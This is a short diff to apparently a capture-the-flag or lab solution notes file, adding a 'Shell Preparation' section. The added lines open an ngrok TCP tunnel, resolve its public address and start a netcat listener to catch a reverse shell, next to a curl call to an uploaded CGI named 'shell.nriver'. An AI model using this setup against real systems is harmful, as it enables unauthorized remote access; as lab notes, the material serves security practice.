@@ -39,6 +39,17 @@
 #### 4 - Call new CGI
 curl http://127.0.0.1/shell.nriver
 
+######################################## Shell Preparation ########################################
+
+#### 1 - Open ngrok tunnel on 443 port
+ngrok tcp 443 	  (0.tcp.eu.ngrok.io:11685)
+
+#### 2 - Resolve ngrok public domain
+dig 0.tcp.eu.ngrok.io (3.125.209.94)
+
+#### 3 - Listen for reverse shell
+rlwrap nc -nlvp 443
+
 
 ######################################## Zip solution ########################################
 
